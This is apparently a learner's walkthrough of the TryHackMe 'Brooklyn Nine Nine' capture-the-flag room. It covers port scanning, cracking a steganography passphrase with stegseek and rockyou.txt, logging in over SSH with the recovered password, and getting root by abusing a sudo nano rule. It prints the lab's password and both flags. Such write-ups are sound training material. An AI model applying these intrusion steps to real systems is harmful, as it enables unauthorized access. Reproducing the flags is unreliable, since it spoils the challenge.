# [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)


First, let's enumerate open ports on the target. This time I used `rustscan` for quick output.
```
rustscan -a 10.48.132.37 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Breaking and entering... into the world of open ports.

[~] The config file is expected to be at "/home/leon/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.48.132.37:21
Open 10.48.132.37:22
Open 10.48.132.37:80
[~] Starting Script(s)
[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-11 14:46 +0600
Initiating Ping Scan at 14:46
Scanning 10.48.132.37 [4 ports]
Completed Ping Scan at 14:46, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:46
Completed Parallel DNS resolution of 1 host. at 14:46, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 14:46
Scanning 10.48.132.37 [3 ports]
Discovered open port 22/tcp on 10.48.132.37
Discovered open port 21/tcp on 10.48.132.37
Discovered open port 80/tcp on 10.48.132.37
Completed SYN Stealth Scan at 14:46, 0.09s elapsed (3 total ports)
Nmap scan report for 10.48.132.37
Host is up, received reset ttl 62 (0.071s latency).
Scanned at 2026-03-11 14:46:55 +06 for 0s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 62
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (172B)
```
Port 80 is open, indicating that a web server is running.. Go to that webserver.
Its just a single page. View the source code. There's a hint:
```
<!-- Have you ever heard of steganography? -->
```
The source code hints at steganography, so I downloaded the background image and attempted to extract hidden data using steghide.
```
steghide extract -sf brooklyn99.jpg                     
Enter passphrase:
```
But it asks for a passphrase. So now we need to bruteforce the passphrase. To do that I used `stegseek` and as for wordlist I used `rockyou.txt`
```
stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt 

[i] Found passphrase: "admin"
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".
```
Found the passphrase (admin). Use steghide again to try to extract the hidden files. 
```
steghide extract -sf brooklyn99.jpg                     
Enter passphrase: 
wrote extracted data to "note.txt".

ls
brooklyn99.jpg note.txt 
```
Found note.txt. Lets see the content of this file.
```
cat note.txt         
Holts Password:
fluffydog12@ninenine

Enjoy!!
```
Here we got the username and password of a user (holt). Lets try to connect to ssh (since port 22 is open) using this credential.
```
ssh holt@10.48.132.37
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
holt@10.48.132.37's password: 
Last login: Wed Mar 11 08:47:25 2026 from 192.168.144.17
holt@brookly_nine_nine:~$ 
holt@brookly_nine_nine:~$ ls
nano.save  user.txt
holt@brookly_nine_nine:~$ whoami
holt
holt@brookly_nine_nine:~$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
```
Got the user flag. 
Next, attempt privilege escalation to obtain the root flag. First, run sudo -l to check which commands can be executed as root.
```
sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```
Looks like we can use nano. `nano` allows editing arbitrary files. Since it can be executed with sudo, we can open /root/root.txt directly and read the root flag.

```
sudo nano /root/root.txt

-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```

DONE!!!!!!!!
